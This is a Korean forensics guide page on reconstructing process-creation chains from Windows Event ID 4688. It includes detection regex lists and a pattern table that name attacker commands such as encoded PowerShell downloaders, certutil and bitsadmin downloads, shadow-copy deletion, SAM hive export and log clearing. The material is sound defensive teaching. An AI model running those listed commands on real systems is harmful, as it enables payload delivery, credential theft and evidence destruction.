@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Event ID 4688 프로세스 생성: CommandLine 과 부모-자식 체인 재구성 · FOR-0088 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=Event%20Log">Event Log</a> / FOR-0088
+      </div>
+      <header class="article-head">
+        <h1>Event ID 4688 프로세스 생성: CommandLine 과 부모-자식 체인 재구성</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">Event Log</span>
+      <span class="badge badge-type">가이드</span>
+      <span class="badge badge-diff diff-intermediate">중급</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">windows</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>4688은 생성된 프로세스마다 한 건씩 기록되며, NewProcessName(무엇이) · ProcessId(누가 낳았나) · CommandLine(어떤 인자로)의 세 필드로 실행 체인을 복원한다 — 단 CommandLine 은 별도 정책이 켜져 있을 때만 기록된다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>EvtxECmd, Event Viewer, PowerShell, Timeline Explorer, wevtutil</td></tr>
+<tr><th>artifact</th><td><code>Security.evtx</code> · <code>4688</code> · <code>CommandLine</code> · <code>프로세스 생성 감사</code> · <code>Detailed Tracking</code> · <code>EVTX</code></td></tr>
+<tr><th>파일 경로</th><td><code>C:\Windows\System32\winevt\Logs\Security.evtx</code> · <code>%SystemRoot%\System32\winevt\Logs</code></td></tr>
+<tr><th>레지스트리</th><td><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit</code></td></tr>
+<tr><th>Event ID</th><td><code>4688</code> · <code>4689</code></td></tr>
+<tr><th>regex</th><td><code>-e(nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{24,}</code> · <code>%%193[678]</code> · <code>0x[0-9a-f]{2,4}</code></td></tr>
+<tr><th>로그 필드</th><td><code>SubjectUserSid</code> · <code>SubjectUserName</code> · <code>SubjectLogonId</code> · <code>NewProcessId</code> · <code>NewProcessName</code> · <code>TokenElevationType</code> · <code>ProcessId</code> · <code>ParentProcessName</code> · <code>CommandLine</code> · <code>MandatoryLabel</code></td></tr>
+<tr><th>파일 형식</th><td><code>evtx</code></td></tr>
+<tr><th>검색 별칭</th><td>4688 · 무슨 명령을 실행했나 · 명령행 로그 · 실행한 프로그램 기록 · 부모 프로세스 찾기 · powershell 실행 흔적 · commandline 안 나온다</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p>4688은 생성된 프로세스마다 한 건씩 기록되며, <code>NewProcessName</code>(무엇이) · <code>ProcessId</code>(누가 낳았나) · <code>CommandLine</code>(어떤 인자로)의 세 필드로 실행 체인을 복원한다 — 단 <strong><code>CommandLine</code> 은 별도 정책이 켜져 있을 때만 기록된다.</strong></p>
+<h2 id="어떤-문제에서-필요한가">어떤 문제에서 필요한가</h2>
+<ul><li>&quot;공격자가 실행한 명령은 무엇인가&quot; (인코딩된 PowerShell, 다운로더, 파일 삭제)</li><li>&quot;이 악성코드는 무엇이 실행시켰나&quot; (문서 매크로 → cmd → powershell 체인)</li><li>&quot;관리자 권한으로 실행되었나&quot; (<code>TokenElevationType</code>)</li><li>&quot;로그온 세션 안에서 무슨 일이 벌어졌나&quot; (<a href="./event-4624-logon.html">FOR-0083</a>에서 얻은 <code>TargetLogonId</code> 를 <code>SubjectLogonId</code> 로 이어붙인다)</li><li>&quot;C2 주소가 명령행에 남아 있나&quot;</li></ul>
+<p>4688은 Security 채널에서 건수가 가장 많은 이벤트다. 감사가 켜진 워크스테이션이면 하루 수만 건이 나온다. <strong>경로 필터 없이 열면 반드시 실패한다.</strong></p>
+<h2 id="문제에서-처음-볼-단서">문제에서 처음 볼 단서</h2>
+<ol><li>지문에 &quot;명령&quot;, &quot;실행&quot;, &quot;인자&quot;, &quot;무엇을 다운로드&quot; → 4688 확정</li><li>첨부에 <code>Security.evtx</code> 가 있고 4624 로 세션을 잡았다 → 같은 <code>SubjectLogonId</code> 의 4688</li><li>메모리 덤프의 <code>windows.cmdline</code> 에서 이미 명령행을 봤다 → 4688 로 <strong>시각</strong>을 확정</li><li>Base64 로 보이는 긴 문자열이 문제에 등장 → <code>CommandLine</code> 안의 <code>-enc</code> 인자</li><li>4688 이 아예 없다 → 감사 미설정 또는 1102(로그 삭제). Sysmon 채널로 우회</li></ol>
+<h2 id="30초-절차">30초 절차</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">Get-WinEvent -FilterHashtable @{Path=&#39;C:\case\Security.evtx&#39;;Id=4688} | Format-List Message</code></pre></div>
+<p>건수를 먼저 세고, 명령행이 실제로 기록되었는지부터 확인한다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 1) 4688 총 건수
+(Get-WinEvent -FilterHashtable @{Path=&#39;C:\case\Security.evtx&#39;;Id=4688}).Count
+
+# 2) 핵심 필드만 평면화 (CommandLine 이 비어 있으면 정책이 꺼져 있었다는 뜻)
+Get-WinEvent -FilterHashtable @{Path=&#39;C:\case\Security.evtx&#39;;Id=4688} |
+  ForEach-Object {
+    $x = [xml]$_.ToXml()
+    $d = @{}; $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.&#39;#text&#39; }
+    [pscustomobject]@{
+      TimeUTC = $_.TimeCreated.ToUniversalTime().ToString(&#39;yyyy-MM-dd HH:mm:ss&#39;)
+      User    = $d[&#39;SubjectUserName&#39;]
+      LogonId = $d[&#39;SubjectLogonId&#39;]
+      NewPid  = $d[&#39;NewProcessId&#39;]
+      NewProc = $d[&#39;NewProcessName&#39;]
+      PPid    = $d[&#39;ProcessId&#39;]
+      Parent  = $d[&#39;ParentProcessName&#39;]
+      Elev    = $d[&#39;TokenElevationType&#39;]
+      Cmd     = $d[&#39;CommandLine&#39;]
+    }
+  } | Export-Csv &#39;C:\case\out\4688.csv&#39; -NoTypeInformation -Encoding UTF8</code></pre></div>
+<p>CSV 로 뽑아 두면 이후 모든 필터가 <code>Import-Csv</code> 한 줄로 끝난다.</p>
+<h2 id="상세-절차">상세 절차</h2>
+<h3 id="1단계-commandline-이-기록되는-조건을-먼저-확정한다">1단계 — CommandLine 이 기록되는 조건을 먼저 확정한다</h3>
+<p>4688 자체는 감사 정책 <code>Detailed Tracking &gt; Audit Process Creation</code> 으로 켜진다. <strong>명령행은 여기에 포함되지 않는다.</strong> 별도의 정책이 하나 더 필요하다.</p>
+<div class="table-wrap"><table><thead><tr><th>항목</th><th>값</th></tr></thead><tbody><tr><td>4688 자체를 켜는 정책</td><td><code>Audit Process Creation</code> (Detailed Tracking 범주)</td></tr><tr><td>명령행을 포함시키는 정책</td><td><code>Include command line in process creation events</code> (Administrative Templates &gt; System &gt; Audit Process Creation)</td></tr><tr><td>그 정책의 레지스트리 위치</td><td><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit</code></td></tr><tr><td>값 이름</td><td><code>ProcessCreationIncludeCmdLine_Enabled</code> (DWORD, <code>1</code> 이면 활성)</td></tr><tr><td>꺼져 있을 때의 4688</td><td><code>CommandLine</code> 필드가 비거나 아예 없다. <code>NewProcessName</code> 경로만 남는다</td></tr></tbody></table></div>
+<p>즉 <strong><code>CommandLine</code> 이 비어 있는 4688 을 보고 &quot;인자 없이 실행됐다&quot;고 판정하면 오답이다.</strong> 그것은 정책이 꺼져 있었다는 뜻일 뿐이다. 실제 이미지를 다루면 SYSTEM hive 의 위 키를 확인해 어느 쪽인지 먼저 가른다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 라이브 시스템에서 두 정책의 상태 확인
+auditpol /get /subcategory:&quot;Process Creation&quot;
+Get-ItemProperty &#39;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit&#39; |
+  Select-Object ProcessCreationIncludeCmdLine_Enabled</code></pre></div>
+<h3 id="2단계-노이즈를-경로로-잘라낸다">2단계 — 노이즈를 경로로 잘라낸다</h3>
+<p>4688 은 부팅·업데이트·백그라운드 작업으로 끊임없이 발생한다.</p>
+<div class="table-wrap"><table><thead><tr><th>버릴 대상</th><th>판별 방법</th></tr></thead><tbody><tr><td>시스템 유지관리</td><td><code>NewProcessName</code> 이 <code>\Windows\System32\svchost.exe</code>, <code>taskhostw.exe</code>, <code>SearchProtocolHost.exe</code>, <code>MpCmdRun.exe</code></td></tr><tr><td>업데이트</td><td>경로에 <code>\Windows\SoftwareDistribution\</code>, <code>TrustedInstaller.exe</code>, <code>TiWorker.exe</code></td></tr><tr><td>컴퓨터 계정이 주체</td><td><code>SubjectUserName</code> 이 <code>$</code> 로 끝남</td></tr><tr><td>SYSTEM 세션</td><td><code>SubjectLogonId</code> = <code>0x3e7</code> (단, 서비스가 낳은 악성 프로세스는 여기 숨는다 — 완전히 버리지 말고 따로 본다)</td></tr></tbody></table></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">Import-Csv &#39;C:\case\out\4688.csv&#39; |
+  Where-Object {
+    $_.NewProc -notmatch &#39;svchost\.exe|taskhostw\.exe|SearchProtocolHost|MpCmdRun|TiWorker|conhost\.exe&#39; -and
+    $_.User -notmatch &#39;\$$&#39;
+  } | Sort-Object TimeUTC | Format-Table -AutoSize</code></pre></div>
+<h3 id="3단계-정상-부모-자식-기준선과-대조한다">3단계 — 정상 부모-자식 기준선과 대조한다</h3>
+<p><strong>이 표가 4688 분석의 절반이다.</strong> 실행 파일 이름만 보면 아무것도 이상하지 않다. 이상한 것은 <strong>누가 그것을 낳았는가</strong>다.</p>
+<div class="table-wrap"><table><thead><tr><th>자식 프로세스</th><th>정상 부모</th><th>정상 경로</th><th>어긋나면</th></tr></thead><tbody><tr><td><code>cmd.exe</code></td><td><code>explorer.exe</code>, <code>services.exe</code>, 스크립트 호스트</td><td><code>\Windows\System32</code></td><td>Office 앱이 부모면 매크로</td></tr><tr><td><code>powershell.exe</code></td><td><code>explorer.exe</code>, <code>cmd.exe</code>, <code>services.exe</code></td><td><code>\System32\WindowsPowerShell\v1.0</code></td><td><code>winword.exe</code>/<code>excel.exe</code>/<code>outlook.exe</code> 가 부모면 <strong>문서 실행</strong></td></tr><tr><td><code>svchost.exe</code></td><td><code>services.exe</code></td><td><code>\Windows\System32</code></td><td>다른 부모면 <strong>위장</strong></td></tr><tr><td><code>lsass.exe</code></td><td><code>wininit.exe</code></td><td><code>\Windows\System32</code></td><td>2개 이상이거나 부모가 다르면 자격증명 탈취 위장</td></tr><tr><td><code>rundll32.exe</code></td><td>실행 주체 애플리케이션</td><td><code>\Windows\System32</code></td><td>인자가 없거나 <code>javascript:</code> 면 <strong>강한 의심</strong></td></tr><tr><td><code>regsvr32.exe</code></td><td><code>explorer.exe</code>, 설치 프로그램</td><td><code>\Windows\System32</code></td><td><code>/i:http</code> 인자는 프록시 실행</td></tr><tr><td><code>wscript.exe</code> / <code>cscript.exe</code></td><td><code>explorer.exe</code></td><td><code>\Windows\System32</code></td><td>메일 첨부 → 스크립트 실행 경로</td></tr><tr><td><code>whoami.exe</code> / <code>net.exe</code> / <code>ipconfig.exe</code></td><td><code>cmd.exe</code>, <code>powershell.exe</code></td><td><code>\Windows\System32</code></td><td>짧은 시간에 연달아 나오면 <strong>정찰(discovery)</strong></td></tr><tr><td>임의 exe</td><td><code>explorer.exe</code></td><td><code>\Users\&lt;user&gt;\AppData\Local\Temp</code></td><td>사용자 임시 폴더 실행은 언제나 의심</td></tr></tbody></table></div>
+<p>메모리 이미지가 함께 주어졌으면 <a href="./volatility-pslist.html">FOR-0214</a>의 부모-자식 기준선 표와 같은 논리로 교차확인한다. 4688 은 <strong>종료된 프로세스까지 남는다</strong>는 점에서 메모리보다 유리하다.</p>
+<h3 id="4단계-pid-로-체인을-잇는다">4단계 — PID 로 체인을 잇는다</h3>
+<p><code>NewProcessId</code> 와 <code>ProcessId</code> 는 <strong>16진수 문자열</strong>로 기록된다. <code>0x1274</code> 는 십진수 4724다. Volatility·Task Manager 는 십진수로 보여주므로 그대로 비교하면 아무것도 매칭되지 않는다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 16진수 -&gt; 십진수
+[Convert]::ToInt32(&#39;1274&#39;, 16)      # 4724
+
+# 십진수 -&gt; 16진수 (4688 검색용)
+&#39;0x{0:x}&#39; -f 4724                   # 0x1274</code></pre></div>
+<p>체인 재구성 절차:</p>
+<ol><li>관심 프로세스의 4688 을 찾아 <code>NewProcessId</code> 를 적는다 (예: <code>0x1274</code>)</li><li>같은 레코드의 <code>ProcessId</code>(부모 PID, 예: <code>0x9ac</code>)를 적는다</li><li><code>NewProcessId</code> = <code>0x9ac</code> 인 4688 을 찾는다 → 부모의 생성 이벤트</li><li>부모가 없어질 때까지 2~3을 반복한다 → 루트가 <code>explorer.exe</code> 인지 <code>services.exe</code> 인지가 곧 침입 경로</li><li>반대 방향으로, <code>ProcessId</code> = <code>0x1274</code> 인 4688 을 모으면 그 프로세스가 낳은 자식 전부</li></ol>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$target = &#39;0x1274&#39;
+$all = Import-Csv &#39;C:\case\out\4688.csv&#39;
+
+# 부모 추적 (위로)
+$all | Where-Object { $_.NewPid -eq $target } | Select-Object TimeUTC, NewProc, PPid, Parent
+
+# 자식 추적 (아래로)
+$all | Where-Object { $_.PPid -eq $target } | Select-Object TimeUTC, NewProc, Cmd</code></pre></div>
+<p><strong>PID 는 재사용된다.</strong> 부팅이 길어지면 같은 <code>0x1274</code> 가 여러 프로세스에 배정된다. 그래서 PID 매칭은 반드시 <strong>시각 창(부모 생성 이후 ~ 자식 생성 시점)</strong> 안에서만 유효하다고 보고, <code>ParentProcessName</code> 문자열과 함께 검증한다.</p>
+<h3 id="5단계-의심-명령행-패턴을-정규식으로-긁는다">5단계 — 의심 명령행 패턴을 정규식으로 긁는다</h3>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$susp = @(
+  &#39;powershell.*-e(nc|ncodedcommand)&#39;,   # Base64 인코딩 명령
+  &#39;powershell.*-w(indowstyle)?\s+hidden&#39;,
+  &#39;powershell.*-nop&#39;,                   # NoProfile
+  &#39;powershell.*(IEX|Invoke-Expression|DownloadString|FromBase64String)&#39;,
+  &#39;certutil.*(-urlcache|-decode|-encode)&#39;,
+  &#39;bitsadmin.*(/transfer|/addfile)&#39;,
+  &#39;rundll32.*javascript:&#39;,
+  &#39;mshta.*(http|javascript:|vbscript:)&#39;,
+  &#39;wmic.*process.*call.*create&#39;,
+  &#39;schtasks.*/create&#39;,
+  &#39;sc(\.exe)?\s+create&#39;,
+  &#39;vssadmin.*delete.*shadows&#39;,
+  &#39;wbadmin.*delete&#39;,
+  &#39;bcdedit.*(recoveryenabled|bootstatuspolicy)&#39;,
+  &#39;net(\.exe)?\s+user.*/add&#39;,
+  &#39;net(\.exe)?\s+localgroup.*administrators.*/add&#39;,
+  &#39;reg(\.exe)?\s+(add|save).*\\(SAM|SYSTEM|SECURITY)&#39;,
+  &#39;wevtutil.*\bcl\b&#39;,
+  &#39;nltest|whoami\s+/priv|net\s+group\s+&quot;domain admins&quot;&#39;
+) -join &#39;|&#39;
+
+Import-Csv &#39;C:\case\out\4688.csv&#39; |
+  Where-Object { $_.Cmd -match $susp } |
+  Select-Object TimeUTC, User, NewProc, Cmd | Format-List</code></pre></div>
+<p>정규식은 <strong>작은따옴표</strong>로 쓴다. 큰따옴표 안의 <code>$</code> 는 PowerShell 이 변수로 확장한다.</p>
+<div class="table-wrap"><table><thead><tr><th>패턴</th><th>무엇을 뜻하는가</th><th>다음 확인</th></tr></thead><tbody><tr><td><code>powershell -enc &lt;Base64&gt;</code></td><td>난독화된 스크립트 실행</td><td>4104 스크립트 블록 로그에서 평문</td></tr><tr><td><code>-w hidden</code> / <code>-nop</code></td><td>창 숨김 + 프로필 무시. 대화형 사용이 아니다</td><td>부모 프로세스</td></tr><tr><td><code>certutil -urlcache -split -f &lt;URL&gt;</code></td><td>LOLBin 다운로더</td><td>다운로드 경로의 <code>$MFT</code> 생성 시각</td></tr><tr><td><code>bitsadmin /transfer</code></td><td>BITS 다운로더</td><td>BITS-Client 채널</td></tr><tr><td><code>rundll32 javascript:...</code></td><td>프록시 실행, 파일 없는 실행</td><td>명령행 전체 문자열</td></tr><tr><td><code>mshta http://...</code></td><td>HTA 원격 실행</td><td>브라우저·메일 흔적</td></tr><tr><td><code>wmic process call create</code></td><td>로컬/원격 프로세스 생성</td><td>대상 호스트의 4624 Type 3</td></tr><tr><td><code>schtasks /create</code></td><td>예약 작업 지속성</td><td><code>\Windows\System32\Tasks</code> XML, 4698</td></tr><tr><td><code>sc create</code></td><td>서비스 지속성</td><td>7045 / 4697</td></tr><tr><td><code>vssadmin delete shadows</code></td><td>섀도 복사본 파괴 (랜섬웨어)</td><td>그 직후 대량 파일 변경</td></tr><tr><td><code>net user &lt;name&gt; /add</code></td><td>계정 생성</td><td>4720, SAM hive</td></tr><tr><td><code>reg save HKLM\SAM</code></td><td>자격증명 hive 반출</td><td>생성된 파일 경로</td></tr><tr><td><code>wevtutil cl</code></td><td>로그 삭제</td><td>1102</td></tr></tbody></table></div>
+<h2 id="출력-필드-해석">출력 필드 해석</h2>
+<p>원본 EventData 의 실제 XML 필드 이름이다. Event Viewer 의 한글 표시명이 아니라 이 이름으로 검색해야 정확하다.</p>
+<div class="table-wrap"><table><thead><tr><th>필드</th><th>의미</th><th>읽는 법</th></tr></thead><tbody><tr><td><code>SubjectUserSid</code></td><td>프로세스를 만든 주체의 SID</td><td><code>S-1-5-18</code> = SYSTEM</td></tr><tr><td><code>SubjectUserName</code></td><td>주체 계정 이름</td><td><code>$</code> 로 끝나면 컴퓨터 계정</td></tr><tr><td><code>SubjectDomainName</code></td><td>주체 도메인</td><td>로컬이면 컴퓨터 이름</td></tr><tr><td><code>SubjectLogonId</code></td><td><strong>로그온 세션 ID (16진수)</strong></td><td>4624 의 <code>TargetLogonId</code> 와 이어붙이는 키</td></tr><tr><td><code>NewProcessId</code></td><td>생성된 프로세스의 PID (<strong>16진수</strong>)</td><td><code>0x1274</code> = 4724</td></tr><tr><td><code>NewProcessName</code></td><td>생성된 실행 파일의 <strong>전체 경로</strong></td><td>경로가 곧 판단 근거. <code>\Temp\</code>, <code>\AppData\</code> 는 의심</td></tr><tr><td><code>TokenElevationType</code></td><td>토큰 승격 종류</td><td>아래 표</td></tr><tr><td><code>ProcessId</code></td><td><strong>부모 프로세스의 PID (16진수)</strong></td><td>이름이 헷갈린다. 이 값이 부모다</td></tr><tr><td><code>ParentProcessName</code></td><td>부모 실행 파일의 전체 경로</td><td>Windows 10 이상에서 채워진다</td></tr><tr><td><code>CommandLine</code></td><td>실행 명령행 전체</td><td>별도 정책 필요. 없으면 빈 값</td></tr><tr><td><code>MandatoryLabel</code></td><td>프로세스 무결성 수준 SID</td><td>아래 표</td></tr><tr><td><code>TargetUserSid</code> / <code>TargetUserName</code> / <code>TargetDomainName</code> / <code>TargetLogonId</code></td><td>다른 계정으로 실행된 경우의 대상 계정</td><td>보통 <code>S-1-0-0</code> / <code>-</code> / <code>0x0</code></td></tr></tbody></table></div>
+<h3 id="tokenelevationtype">TokenElevationType</h3>
+<p>값은 <code>%%</code> 로 시작하는 메시지 테이블 참조자로 저장된다. Event Viewer 는 이를 문자열로 바꿔 보여주지만 <strong>원본 XML 과 CSV 에는 숫자 코드가 그대로 남는다.</strong></p>
+<div class="table-wrap"><table><thead><tr><th>값</th><th>이름</th><th>의미</th></tr></thead><tbody><tr><td><code>%%1936</code></td><td><code>TokenElevationTypeDefault</code></td><td>UAC 가 꺼져 있거나, 승격 개념이 없는 계정(예: 기본 Administrator, 표준 사용자)의 기본 토큰</td></tr><tr><td><code>%%1937</code></td><td><code>TokenElevationTypeFull</code></td><td><strong>관리자 권한 전체 토큰.</strong> 승격 실행(&quot;관리자 권한으로 실행&quot;)</td></tr><tr><td><code>%%1938</code></td><td><code>TokenElevationTypeLimited</code></td><td>UAC 로 축소된 제한 토큰. 일반 실행</td></tr></tbody></table></div>
+<p><code>%%1937</code> 인 4688 은 그 자체로 우선 조사 대상이다. 여기에 <code>NewProcessName</code> 이 <code>cmd.exe</code> / <code>powershell.exe</code> 면 승격된 셸이다.</p>
+<h3 id="mandatorylabel-무결성-수준">MandatoryLabel (무결성 수준)</h3>
+<div class="table-wrap"><table><thead><tr><th>SID</th><th>수준</th><th>의미</th></tr></thead><tbody><tr><td><code>S-1-16-4096</code></td><td>Low</td><td>브라우저 샌드박스 등</td></tr><tr><td><code>S-1-16-8192</code></td><td>Medium</td><td>일반 사용자 프로세스</td></tr><tr><td><code>S-1-16-12288</code></td><td>High</td><td>승격된 관리자 프로세스</td></tr><tr><td><code>S-1-16-16384</code></td><td>System</td><td>SYSTEM 프로세스</td></tr></tbody></table></div>
+<p><code>MandatoryLabel</code> 이 <code>S-1-16-12288</code> 이면서 부모가 사용자 프로세스면 승격 지점이다.</p>
+<h3 id="원본-xml-예시">원본 XML 예시</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">&lt;EventData&gt;
+  &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-5-21-1004336348-1177238915-682003330-1103&lt;/Data&gt;
+  &lt;Data Name=&quot;SubjectUserName&quot;&gt;svc_backup&lt;/Data&gt;
+  &lt;Data Name=&quot;SubjectDomainName&quot;&gt;WIN10-DEV&lt;/Data&gt;
+  &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x1a2b3c&lt;/Data&gt;
+  &lt;Data Name=&quot;NewProcessId&quot;&gt;0x1274&lt;/Data&gt;
+  &lt;Data Name=&quot;NewProcessName&quot;&gt;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&lt;/Data&gt;
+  &lt;Data Name=&quot;TokenElevationType&quot;&gt;%%1937&lt;/Data&gt;
+  &lt;Data Name=&quot;ProcessId&quot;&gt;0x9ac&lt;/Data&gt;
+  &lt;Data Name=&quot;CommandLine&quot;&gt;powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A...&lt;/Data&gt;
+  &lt;Data Name=&quot;ParentProcessName&quot;&gt;C:\Windows\System32\cmd.exe&lt;/Data&gt;
+  &lt;Data Name=&quot;MandatoryLabel&quot;&gt;S-1-16-12288&lt;/Data&gt;
+&lt;/EventData&gt;</code></pre></div>
+<p><code>TimeCreated SystemTime</code> 은 <strong>UTC</strong> 로 저장된다. Event Viewer 는 로컬 시간대로 변환해 표시하므로 두 화면의 숫자가 다르다. <strong>답이 KST 면 UTC + 9시간.</strong> 시스템의 실제 시간대는 SYSTEM hive 의 <code>TimeZoneInformation</code> 으로 확인한다(<a href="./system-timezone.html">FOR-0054</a>).</p>
+<h2 id="pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>4688 에서 얻은 것</th><th>다음 목표</th><th>확인할 것</th></tr></thead><tbody><tr><td><code>SubjectLogonId</code></td><td>4624 (<a href="./event-4624-logon.html">FOR-0083</a>)</td><td>그 세션이 누구·어디서 시작됐는지</td></tr><tr><td><code>SubjectLogonId</code></td><td>4672</td><td>그 세션이 관리자 권한이었는지</td></tr><tr><td><code>CommandLine</code> 의 <code>-enc</code> Base64</td><td>PowerShell 4104 (Operational 채널)</td><td>디코딩된 스크립트 본문</td></tr><tr><td><code>NewProcessName</code> 경로</td><td><code>$MFT</code> (<a href="./mft-basics.html">FOR-0021</a>)</td><td>그 실행 파일이 언제 생성·삭제됐는지</td></tr><tr><td><code>NewProcessName</code> 파일명</td><td>Prefetch, Amcache, AppCompatCache</td><td>실행 횟수와 최초 실행 시각</td></tr><tr><td><code>CommandLine</code> 안의 URL/IP</td><td>pcap <code>ip.addr == &lt;IP&gt;</code></td><td>실제 통신 내용</td></tr><tr><td><code>sc create</code> / <code>schtasks /create</code></td><td>7045, 4697, Tasks XML</td><td>지속성 등록 여부</td></tr><tr><td><code>net user /add</code></td><td>4720, SAM hive</td><td>생성된 계정과 RID</td></tr><tr><td><code>ProcessId</code>(부모)</td><td>같은 파일의 다른 4688</td><td>체인 루트까지 역추적</td></tr><tr><td><code>NewProcessId</code></td><td>4689 (프로세스 종료)</td><td>프로세스 수명 = 활동 구간</td></tr></tbody></table></div>
+<h2 id="흔한-함정">흔한 함정</h2>
+<ul><li><strong><code>CommandLine</code> 이 비었는데 &quot;인자 없이 실행&quot;으로 판정한다.</strong> 별도 정책(<code>ProcessCreationIncludeCmdLine_Enabled</code>)이 꺼져 있으면 필드 자체가 비거나 없다. 정책 상태를 먼저 확인하고, 꺼져 있었다면 명령행은 Sysmon 1 · PowerShell 4104 · Prefetch 로 우회한다.</li><li><strong><code>ProcessId</code> 를 생성된 프로세스의 PID 로 읽는다.</strong> 4688 에서 생성된 쪽은 <code>NewProcessId</code> 다. <code>ProcessId</code> 는 <strong>부모</strong>다. 이름 때문에 가장 자주 틀리는 지점이다.</li><li><strong>16진수 PID 를 십진수로 비교한다.</strong> <code>0x1274</code> 를 &quot;1274&quot; 로 검색하면 아무것도 안 나온다. 반드시 변환한 뒤 대조한다.</li><li><strong>PID 재사용을 무시한다.</strong> 부팅이 오래 지속되면 같은 PID 가 여러 프로세스에 배정된다. 시각 창과 <code>ParentProcessName</code> 문자열을 함께 검증한다.</li><li><strong><code>ParentProcessName</code> 이 없는 구버전 로그에서 부모를 포기한다.</strong> 이 필드는 Windows 10 이상에서 채워진다. 없으면 <code>ProcessId</code> 값으로 부모의 4688 을 직접 찾는다.</li><li><strong>실행 파일 이름만 보고 정상 판정한다.</strong> <code>svchost.exe</code> 는 이름이 정상이어도 부모가 <code>services.exe</code> 가 아니면 위장이다. 판단은 항상 (경로 + 부모 + 명령행) 조합으로 한다.</li><li><strong><code>%%1937</code> 을 문자열로 렌더된 값으로만 찾는다.</strong> 원본 XML·EvtxECmd CSV 에는 <code>%%1937</code> 이 그대로 들어 있다. <code>&quot;Full&quot;</code> 로 검색하면 놓친다.</li><li><strong>UTC/로컬 혼동.</strong> EVTX 내부 <code>SystemTime</code> 은 UTC 다. Event Viewer 표시값과 EvtxECmd CSV 값이 다르게 보이는 이유가 이것이다. KST 답은 +9시간.</li><li><strong>4688 이 없으면 실행이 없었다고 결론 낸다.</strong> 감사 미설정, 1102 로그 삭제, 로그 롤오버(파일 크기 초과로 오래된 레코드 덮어쓰기) 세 가능성을 먼저 배제한다.</li><li><strong>Temp 경로 실행을 전부 악성으로 몬다.</strong> 설치 프로그램은 정상적으로 Temp 에서 실행된다. 서명·파일명·부모를 함께 본다.</li></ul>
+<h2 id="교차검증">교차검증</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 1) 4688 — 대상 명령행 확정
+Get-WinEvent -FilterHashtable @{Path=&#39;C:\case\Security.evtx&#39;;Id=4688} |
+  Where-Object { $_.Message -match &#39;certutil|-enc|mshta&#39; }
+
+# 2) 4689 — 같은 PID 의 종료 시각 (프로세스 수명)
+Get-WinEvent -FilterHashtable @{Path=&#39;C:\case\Security.evtx&#39;;Id=4689} |
+  Where-Object { $_.Message -match &#39;0x1274&#39; }
+
+# 3) 4624 — 그 SubjectLogonId 세션의 출처
+Get-WinEvent -FilterHashtable @{Path=&#39;C:\case\Security.evtx&#39;;Id=4624} |
+  Where-Object { $_.Message -match &#39;0x1a2b3c&#39; }
+
+# 4) PowerShell 4104 — -enc 로 넘긴 스크립트의 평문
+Get-WinEvent -FilterHashtable @{
+  Path=&#39;C:\case\Microsoft-Windows-PowerShell%4Operational.evtx&#39;; Id=4104
+} | Select-Object -ExpandProperty Message
+
+# 5) Sysmon 1 — 해시와 부모 명령행까지
+Get-WinEvent -FilterHashtable @{
+  Path=&#39;C:\case\Microsoft-Windows-Sysmon%4Operational.evtx&#39;; Id=1
+}</code></pre></div>
+<h3 id="4688-과-sysmon-event-1-비교">4688 과 Sysmon Event 1 비교</h3>
+<p>같은 &quot;프로세스 생성&quot;이지만 정보량이 다르다. 둘 다 있으면 <strong>Sysmon 1 을 먼저 본다.</strong></p>
